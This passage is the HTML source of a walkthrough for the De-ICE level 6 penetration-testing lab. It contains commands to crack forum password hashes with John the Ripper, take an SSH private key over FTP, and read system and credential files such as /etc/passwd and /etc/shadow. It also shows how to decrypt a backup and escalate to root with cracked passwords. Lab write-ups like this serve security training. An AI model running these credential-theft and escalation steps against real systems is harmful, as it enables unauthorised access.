</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;MBrown&#39;</span><span class="p">,</span> <span class="s1">&#39;Mark Brown&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;0000-00-00&#39;</span><span class="p">,</span> <span class="s1">&#39;8a1bae9881bfbfc68880d1e23d6a095e80db27b7c43e56ccc1&#39;</span><span class="p">,</span> <span class="s1">&#39;mb@lazyadmin.corp&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="s1">&#39;2015-08-18 05:10:11&#39;</span><span class="p">,</span> <span class="s1">&#39;2015-08-18 05:45:17&#39;</span><span class="p">,</span> <span class="s1">&#39;192.168.1.28&#39;</span><span class="p">,</span> <span class="s1">&#39;2013-03-09 15:23:28&#39;</span><span class="p">,</span> <span class="no">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;6,10,11,12,13,14,9,7,15,1,2,3,4,5,8&#39;</span><span class="p">),</span>
<span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;SWillard&#39;</span><span class="p">,</span> <span class="s1">&#39;Sandy Willard&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;0000-00-00&#39;</span><span class="p">,</span> <span class="s1">&#39;c19038340b8f5d1fc70e9bfbc3336f7bf1e0935da5ef13d4ef&#39;</span><span class="p">,</span> <span class="s1">&#39;sw@lazyadmin.corp&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;2013-03-24 18:09:08&#39;</span><span class="p">,</span> <span class="s1">&#39;2013-03-24 18:09:27&#39;</span><span class="p">,</span> <span class="s1">&#39;192.168.8.1&#39;</span><span class="p">,</span> <span class="s1">&#39;2013-03-09 15:25:13&#39;</span><span class="p">,</span> <span class="no">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;6,10,11,12,13,14,8,9,7,15,1,2,3,4,5&#39;</span><span class="p">);</span>
</pre></div>
</div>
<p>The functions generate_pw_hash (to create the password) and is_pw_correct (to verify the password) are found in <a class="reference external" href="http://sourceforge.net/p/mylittleforum/code/ci/master/tree/includes/functions.inc.php">functions.inc.php</a>. The last 10 hex characters are the salt and the first 40 are the salted SHA1 hash. So for mbrown with password ‘!DFiuoTkbxtdk0!’ and hash ‘8a1bae9881bfbfc68880d1e23d6a095e80db27b7c43e56ccc1’ we can check:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SALTED_HASH</span><span class="o">=</span><span class="s1">&#39;8a1bae9881bfbfc68880d1e23d6a095e80db27b7c43e56ccc1&#39;</span>
<span class="nv">HASH</span><span class="o">=</span><span class="si">${</span><span class="nv">SALTED_HASH</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">40</span><span class="si">}</span>
<span class="nv">SALT</span><span class="o">=</span><span class="si">${</span><span class="nv">SALTED_HASH</span><span class="p">:</span><span class="nv">40</span><span class="p">:</span><span class="nv">10</span><span class="si">}</span>
<span class="nv">PW</span><span class="o">=</span><span class="s1">&#39;!DFiuoTkbxtdk0!&#39;</span>
<span class="nv">PWSALT</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PW$SALT</span><span class="s2">&quot;</span>
<span class="nv">COMPUTED_HASH</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$PWSALT</span><span class="s2">&quot;</span> <span class="p">|</span> sha1sum<span class="k">)</span>
<span class="nv">COMPUTED_HASH</span><span class="o">=</span><span class="si">${</span><span class="nv">COMPUTED_HASH</span><span class="p">%  -</span><span class="si">}</span>    <span class="c1"># eliminate trailing &quot;  -&quot;</span>
<span class="nb">echo</span> <span class="nv">$HASH</span>
<span class="nb">echo</span> <span class="nv">$COMPUTED_HASH</span>
<span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$HASH</span><span class="s2">&quot;</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="nv">$COMPUTED_HASH</span><span class="s2">&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nb">echo</span> <span class="s2">&quot;They are equal&quot;</span>
<span class="k">else</span>
  <span class="nb">echo</span> <span class="s2">&quot;They are NOT equal&quot;</span>
<span class="k">fi</span>
</pre></div>
</div>
<p>This format is <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats">John The Ripper Hash Formats</a> “sha1-gen – Generic salted SHA-1” except that the password file should have “SHA1s” and not “SHA1p”:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice6
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice6_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="o">{</span> <span class="nb">echo</span> <span class="s1">&#39;admin:$SHA1s$63cbb16261$fd339d53bf599d4ec7281ace84a902dc2ca16c7f:::::::&#39;</span>
<span class="hll">  <span class="nb">echo</span> <span class="s1">&#39;RHedley:$SHA1s$6fcf7b1ba3$31cbbdab9f5e1ebfa7d81267c258e29b5f9e171e:::::::&#39;</span>
</span>  <span class="nb">echo</span> <span class="s1">&#39;MBrown:$SHA1s$c43e56ccc1$8a1bae9881bfbfc68880d1e23d6a095e80db27b7:::::::&#39;</span>
  <span class="nb">echo</span> <span class="s1">&#39;SWillard:$SHA1s$a5ef13d4ef$c19038340b8f5d1fc70e9bfbc3336f7bf1e0935d:::::::&#39;</span>
<span class="o">}</span> &gt; hashes_mlf2_userdata.txt

<span class="hll"><span class="c1"># Get darkc0de.txt password list.</span>
</span>curl --silent --location --output darkc0de.txt <span class="se">\</span>
    https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkc0de.txt?raw<span class="o">=</span><span class="nb">true</span>

rm -rf <span class="nv">$HOME</span>/.john
<span class="hll">/usr/sbin/john --format:sha1-gen --wordlist:darkc0de.txt hashes_mlf2_userdata.txt
</span><span class="hll">/usr/sbin/john --show --format:sha1-gen hashes_mlf2_userdata.txt
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># RHedley:tum-ti-tum:::::::</span>
</span></pre></div>
</div>
<p>So we’ve cracked “rhedley“‘s hash to reveal password “tum-ti-tum”.</p>
</div>
<div class="section" id="exploring-ftp-as-rhedley">
<h3>3.3.3.2. Exploring FTP as rhedley<a class="headerlink" href="#exploring-ftp-as-rhedley" title="Permalink to this headline">¶</a></h3>
<p>Exploring with an FTP client using user “rhedley” and password “tum-ti-tum” showed these FTP top level directories: ftp, mbrown, mparker, rhedley, sraines, swillard (though ftp client said “No such file or directory” when attempting to <code class="docutils literal notranslate"><span class="pre">cd</span> <span class="pre">swillard</span></code>). Download the only visible file <code class="file docutils literal notranslate"><span class="pre">/ftp/incoming/backup_webhost_130111.tar.gz.enc</span></code>. It’s probably <strong class="program">openssl</strong>-encrypted but none of the known passwords would decrypt it.</p>
<p>If you’re really persistent you’ll realize that we have Linux home directories with probably normal subdirectories. Since we’re looking for a way to SSH into the server we certainly should try looking for <code class="file docutils literal notranslate"><span class="pre">.ssh/</span></code> sudirectories. Only <code class="file docutils literal notranslate"><span class="pre">mbrown/.ssh/</span></code> existed, and it had a readable file <code class="file docutils literal notranslate"><span class="pre">mbrown/.ssh/downloadkey</span></code> which could be downloaded (but <code class="file docutils literal notranslate"><span class="pre">mbrown/.ssh/id_rsa</span></code> could not). Running <code class="docutils literal notranslate"><span class="pre">file</span> <span class="pre">downloadkey</span></code> showed the file was a “PEM RSA private key” which we could use to SSH to de-ice6.com.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice6
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice6_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll">ftp de-ice6.com
</span><span class="hll"><span class="c1"># rhedley</span>
</span><span class="hll"><span class="c1"># tum-ti-tum</span>
</span><span class="hll"><span class="nb">cd</span> mbrown/.ssh
</span><span class="hll">ls
</span><span class="hll">get downloadkey
</span><span class="hll">quit
</span><span class="hll">file downloadkey
</span><span class="hll">chmod <span class="m">600</span> downloadkey
</span><span class="hll">ssh -i downloadkey mbrown@de-ice6.com
</span><span class="hll"><span class="c1"># results in log into de-ice6.com as mbrown</span>
</span></pre></div>
</div>
</div>
<div class="section" id="exploring-ssh-as-mbrown">
<h3>3.3.3.3. Exploring SSH as mbrown<a class="headerlink" href="#exploring-ssh-as-mbrown" title="Permalink to this headline">¶</a></h3>
<p>And we’re finally on de-ice6. A quick check shows that <code class="file docutils literal notranslate"><span class="pre">.ssh/downloadkey</span></code> and <code class="file docutils literal notranslate"><span class="pre">.ssh/id_rsa</span></code> are identical. Let’s quickly see what users we should target.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat /etc/passwd
<span class="c1"># results in</span>
<span class="c1"># mbrown:x:1001:1001:Mark Brown,404,2457,:/home/mbrown:/bin/bash</span>
<span class="c1"># rhedley:x:1002:1002:Richard Hedley,407,3412,:/home/rhedley:/bin/bash</span>
<span class="hll"><span class="c1"># swillard:x:1003:1003:Sandy Willard,401,1429,:/home/swillard:/bin/bash</span>
</span><span class="c1"># mparker:x:1004:1004:Miles Parker,403,6283,:/home/mparker:/bin/bash</span>

cat /etc/group
<span class="c1"># results in</span>
<span class="hll"><span class="c1"># sudo:x:27:swillard</span>
</span><span class="c1"># ftpuser:x:997:rhedley,mbrown,ftp</span>
<span class="hll"><span class="c1"># ftpadmin:x:999:rhedley,swillard</span>
</span><span class="hll"><span class="c1"># sshlogin:x:998:swillard,mbrown</span>
</span>
cat /etc/ssh/sshd_config
<span class="c1"># results in</span>
<span class="hll"><span class="c1"># PermitRootLogin no</span>
</span><span class="hll"><span class="c1"># PasswordAuthentication no</span>
</span>
<span class="hll"><span class="c1"># NOTE - only way to get to root is through swillard</span>
</span>
<span class="hll">ls -al /opt
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll">-rwxrw----+ <span class="m">1</span> root root <span class="m">654</span> May <span class="m">13</span>  <span class="m">2013</span> backup.sh
</span><span class="c1"># Using root with password &quot;S4!y.dk)j/_d1pKtX1&quot; fails.</span>
<span class="c1"># su - root</span>
<span class="hll">getfacl backup.sh
</span><span class="c1"># results in</span>
<span class="c1"># # file: backup.sh</span>
<span class="c1"># # owner: root</span>
<span class="c1"># # group: root</span>
<span class="c1"># user::rwx</span>
<span class="c1"># group::rw-</span>
<span class="hll"><span class="c1"># group:ftpadmin:r--</span>
</span><span class="c1"># mask::rw-</span>
<span class="c1"># other::---</span>

<span class="hll"><span class="c1"># So ftpadmin users (rhedley and swillard) can read the backup.sh file.</span>
</span><span class="hll">su - rhedley    <span class="c1"># password &quot;tum-ti-tum&quot;</span>
</span><span class="hll">cat /opt/backup.sh
</span></pre></div>
</div>
<p>We see the script <code class="file docutils literal notranslate"><span class="pre">/opt/backup.sh</span></code> tells us how the file we downloaded earlier (<code class="file docutils literal notranslate"><span class="pre">/ftp/incoming/backup_webhost_130111.tar.gz.enc</span></code>) was encrypted:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
<span class="c1">## Backup Script</span>
<span class="c1">## by SRaines</span>
<span class="c1">## Lazy Admin Corp</span>

<span class="nv">TMPBACKUP</span><span class="o">=</span><span class="s2">&quot;/tmp/backup&quot;</span><span class="p">;</span>

<span class="nv">NAME_PREFIX</span><span class="o">=</span><span class="s2">&quot;backup&quot;</span><span class="p">;</span>
<span class="nv">NAME_DATE</span><span class="o">=</span><span class="k">$(</span>date +%y%m%d<span class="k">)</span><span class="p">;</span>
<span class="nv">NAME_HOST</span><span class="o">=</span><span class="k">$(</span>/bin/hostname<span class="k">)</span><span class="p">;</span>
<span class="nv">FILENAME</span><span class="o">=</span><span class="si">${</span><span class="nv">NAME_PREFIX</span><span class="si">}</span>_<span class="si">${</span><span class="nv">NAME_HOST</span><span class="si">}</span>_<span class="si">${</span><span class="nv">NAME_DATE</span><span class="si">}</span>.tar<span class="p">;</span>

<span class="o">[</span> ! -d <span class="si">${</span><span class="nv">TMPBACKUP</span><span class="si">}</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> mkdir -p <span class="si">${</span><span class="nv">TMPBACKUP</span><span class="si">}</span>

tar cpf <span class="si">${</span><span class="nv">TMPBACKUP</span><span class="si">}</span>/<span class="si">${</span><span class="nv">FILENAME</span><span class="si">}</span> /etc/fstab /etc/apache2 /etc/hosts /etc/motd /etc/ssh/sshd_config /etc/dovecot /etc/postfix /var/www /home /opt

gzip --best -f <span class="si">${</span><span class="nv">TMPBACKUP</span><span class="si">}</span>/<span class="si">${</span><span class="nv">FILENAME</span><span class="si">}</span>

<span class="hll">openssl aes-256-cbc -in <span class="si">${</span><span class="nv">TMPBACKUP</span><span class="si">}</span>/<span class="si">${</span><span class="nv">FILENAME</span><span class="si">}</span>.gz -out <span class="si">${</span><span class="nv">TMPBACKUP</span><span class="si">}</span>/<span class="si">${</span><span class="nv">FILENAME</span><span class="si">}</span>.gz.enc -pass pass:wpaR9V616xrDTy98L7Uje2DDU5hWtWhs
</span>
mv <span class="si">${</span><span class="nv">TMPBACKUP</span><span class="si">}</span>/<span class="si">${</span><span class="nv">FILENAME</span><span class="si">}</span>.gz.enc ./

rm -fr <span class="si">${</span><span class="nv">TMPBACKUP</span><span class="si">}</span>
</pre></div>
</div>
</div>
<div class="section" id="getting-etc-shadow">
<h3>3.3.3.4. Getting <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code><a class="headerlink" href="#getting-etc-shadow" title="Permalink to this headline">¶</a></h3>
<p>So to decrypt <code class="file docutils literal notranslate"><span class="pre">backup_webhost_130111.tar.gz.enc</span></code> back on Kali all we need do is <code class="docutils literal notranslate"><span class="pre">openssl</span> <span class="pre">aes-256-cbc</span> <span class="pre">-d</span></code>. That reveals an older (but still good) <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code> giving us swillard’s (nee sraines) hash which we crack:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">openssl aes-256-cbc -d <span class="se">\</span>
</span><span class="hll">  -in backup_webhost_130111.tar.gz.enc <span class="se">\</span>
</span><span class="hll">  -out backup_webhost_130111.tar.gz <span class="se">\</span>
</span><span class="hll">  -pass pass:wpaR9V616xrDTy98L7Uje2DDU5hWtWhs
</span>tar -xvf backup_webhost_130111.tar.gz
ls /etc
<span class="c1"># Must su to root</span>
<span class="hll">grep root etc/shadow
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># root:!:15773:0:99999:7:::</span>
</span><span class="hll"><span class="c1"># &quot;!&quot; instead of hash means must su to root</span>
</span><span class="hll">cat etc/sudoers
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># %sudo       ALL=(ALL:ALL) ALL</span>
</span><span class="hll"><span class="c1"># So only sudo group members can get root and that is swillard, nee sraines.</span>
</span><span class="hll"><span class="c1"># So crack her hash.</span>
</span>
<span class="hll">/usr/sbin/unshadow etc/passwd etc/shadow &gt; unshadow.txt
</span><span class="hll">grep sraines unshadow.txt &gt; crackme.txt
</span><span class="hll">/usr/sbin/john --rules --wordlist<span class="o">=</span>darkc0de.txt crackme.txt
</span><span class="hll">/usr/sbin/john --show crackme.txt
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># sraines:brillantissimo:1000:1000:Sandy Raines,401,1429,:/home/sraines:/bin/bash</span>
</span></pre></div>
</div>
</div>
<div class="section" id="capturing-the-flag">
<h3>3.3.3.5. Capturing the flag<a class="headerlink" href="#capturing-the-flag" title="Permalink to this headline">¶</a></h3>
<p>To put it all together starting from Kali:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ssh -i downloadkey mbrown@de-ice6.com
su - swillard    <span class="c1"># password &quot;brillantissimo&quot;</span>
sudo su - root    <span class="c1"># password &quot;brillantissimo&quot;</span>
id
<span class="c1"># results in</span>
<span class="c1"># uid=0(root) gid=0(root) groups=0(root)</span>
ls -l /root
<span class="c1"># results in</span>
<span class="c1"># -rw-r--r-- 1 root root 22852 May 17  2011 secret.jpg</span>
</pre></div>
</div>
<p>We leave it as an exercise to the reader to transfer the file back to Kali.</p>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="de-ice5.html" class="btn btn-neutral float-right" title="3.4. De-ICE Level 5" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="owlnest.html" class="btn btn-neutral" title="3.2. OwlNest" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            LANGUAGE:'None',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  <script type="text/javascript">
      jQuery(function () {
          
          SphinxRtdTheme.Navigation.enableSticky();
          
      });
  </script> 

</body>
</html>